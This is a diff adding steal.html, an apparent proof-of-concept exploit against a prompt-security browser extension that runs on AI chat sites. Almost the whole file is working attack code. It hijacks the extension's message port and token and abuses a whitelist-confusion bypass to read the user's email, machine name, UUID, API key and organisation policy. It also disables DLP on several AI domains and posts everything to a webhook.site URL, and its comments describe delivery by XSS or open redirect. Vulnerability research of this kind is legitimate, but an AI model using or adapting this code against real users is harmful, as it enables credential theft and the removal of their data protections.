@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Connecting to AI tools...</title>
+    <style>
+        body { background: #0a0a0a; color: #e0e0e0; font-family: monospace; padding: 20px; }
+        pre { background: #111; padding: 12px; border-radius: 6px; font-size: 13px; color: #7c3aed; }
+        .ok { color: #16a34a; } .err { color: #dc2626; } .dim { color: #555; }
+    </style>
+</head>
+<body>
+<pre id="log">Initializing...</pre>
+
+<script>
+/**
+ * steal.html — Prompt Security Extension Phase 2
+ * ─────────────────────────────────────────────────────────────────
+ * Designed to run on any monitored AI domain (chatgpt.com, claude.ai,
+ * gemini.google.com, etc.) where script.bundle.js is injected and the
+ * MessageChannel port is established by the content script.
+ *
+ * Can be loaded via:
+ *   1. XSS on any monitored AI platform
+ *   2. Open redirect: https://chatgpt.com/auth/login?next=https://nishantshekhar2.github.io/prompt-security-extension-poc/steal.html
+ *   3. Direct navigation while testing
+ *
+ * Attack:
+ *   Intercepts ps_rpc_port handshake → steals port2 + token →
+ *   uses whitelist confusion bypass (message:"callProtectApi" passes
+ *   whitelist, type:"getSiteActionConfig" routes to identity handler) →
+ *   exfils email, machineName, UUID, API key, org policy to webhook.
+ */
+
+const EXFIL = "https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039";
+const EXT_ID = "iidnankcocecmgpcafggbgbmkbcldmno";
+
+const log = (msg, cls = "") => {
+    const el = document.getElementById("log");
+    el.innerHTML += `\n<span class="${cls}">${msg}</span>`;
+};
+
+let port = null, token = null;
+
+function exfil(data) {
+    fetch(EXFIL, { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data, null, 2), mode: "no-cors" }).catch(() => {});
+    try { navigator.sendBeacon(EXFIL, new Blob([JSON.stringify(data)], { type: "application/json" })); } catch(e) {}
+}
+
+function portSend(typeHandler, extra = {}, ms = 8000) {
+    return new Promise(resolve => {
+        if (!port || !token) { resolve({ _error: "no port" }); return; }
+        const id = crypto.randomUUID();
+        const prev = port.onmessage;
+        port.onmessage = e => {
+            if (e.data?.messageId === id) { port.onmessage = prev; resolve(e.data.response); }
+            else if (prev) prev(e);
+        };
+        // BYPASS A: whitelist sees "callProtectApi" (allowed)
+        //           background routes on type:"<handler>" (privileged)
+        port.postMessage({ token, messageId: id, message: {
+            message: "callProtectApi",   // ← passes ALLOWED_PAGE_MESSAGES check
+            type: typeHandler,           // ← background dispatches on this
+            ...extra,
+            ctx: { flowTraceId: crypto.randomUUID() }
+        }});
+        setTimeout(() => resolve({ _timeout: true }), ms);
+    });
+}
+
+async function runPhase2() {
+    log(`[phase2] Page origin: ${location.origin}`, "dim");
+    log(`[phase2] Waiting for ps_rpc_port handshake...`);
+
+    // Wait for port — content script fires this after script.bundle.js loads
+    const portReady = await new Promise(resolve => {
+        window.addEventListener("message", function h(e) {
+            if (e.data?.ps_rpc_port === true && e.ports?.length > 0) {
+                port = e.ports[0];
+                token = e.data.token;
+                port.start();
+                window.removeEventListener("message", h);
+                resolve(true);
+            }
+        });
+        setTimeout(() => resolve(false), 8000);
+    });
+
+    if (!portReady) {
+        log("[phase2] Port not established — extension not injecting on this domain", "err");
+        log("[phase2] Falling back to externally_connectable probe...", "dim");
+        exfil({ phase: 2, origin: location.origin, portEstablished: false,
+                error: "Domain not monitored — no injection" });
+        return;
+    }
+
+    log(`[phase2] Port intercepted. Token: ${token?.slice(0,8)}...`, "ok");
+
+    // BYPASS A — getSiteActionConfig → email, machineName, UUID, org policy
+    log("[phase2] Exfiltrating user identity via whitelist confusion...");
+    const identity = await portSend("getSiteActionConfig", { domain: location.hostname });
+    const ui = identity?.userInfo;
+
+    if (ui?.email) {
+        log(`[phase2] EMAIL: ${ui.email}`, "ok");
+        log(`[phase2] MACHINE: ${ui.machineName || "N/A"}`, "ok");
+        log(`[phase2] UUID: ${ui.userUUID || "N/A"}`, "ok");
+        log(`[phase2] IDENTITY_SOURCE: ${ui.identitySource || "N/A"}`, "ok");
+    } else {
+        log(`[phase2] identity response: ${JSON.stringify(identity)}`, "err");
+    }
+
+    // BYPASS A — getPopupSettings → API key
+    log("[phase2] Exfiltrating API key...");
+    const apiKey = await portSend("getPopupSettings");
+    if (apiKey?.apiKey) log(`[phase2] API KEY: ${apiKey.apiKey}`, "ok");
+    if (apiKey?.apiDomain) log(`[phase2] API DOMAIN: ${apiKey.apiDomain}`, "ok");
+
+    // BYPASS A — aiChatBlockMessageBypass → disable DLP for attacker domains
+    log("[phase2] Bypassing DLP protections...");
+    for (const d of ["chatgpt.com", "claude.ai", "gemini.google.com"]) {
+        await portSend("aiChatBlockMessageBypass", { domain: d });
+        log(`[phase2] DLP bypassed: ${d}`, "ok");
+    }
+
+    // Exfil everything
+    const payload = {
+        phase: 2,
+        mode: "monitored_domain_attack",
+        origin: location.origin,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        portEstablished: true,
+        token: token,
+        // IDENTITY
+        userEmail: ui?.email || null,
+        profileEmail: ui?.profileEmail || null,
+        machineName: ui?.machineName || null,
+        userUUID: ui?.userUUID || null,
+        identitySource: ui?.identitySource || null,
+        workProfileDomain: identity?.workProfileDomain || null,
+        // ORG POLICY
+        globalCanBypass: identity?.globalSettingsCanBypassInspection,
+        isDisabled: identity?.isExtensionDisabled,
+        ignoredDomains: identity?.ignoredDomains,
+        domainActions: identity?.domainActions,
+        // API KEY
+        apiKey: apiKey?.apiKey || null,
+        apiDomain: apiKey?.apiDomain || null,
+        isManagedKey: apiKey?.isManagedApiKey,
+        // RAW
+        _raw: { identity, apiKey }
+    };
+
+    exfil(payload);
+    log(`\n[phase2] ✓ All data exfiltrated to webhook.`, "ok");
+    log(`[phase2] Email: ${ui?.email || "N/A"} | Key: ${apiKey?.apiKey || "MDM-managed"}`, "ok");
+}
+
+runPhase2();
+</script>
+</body>
+</html>
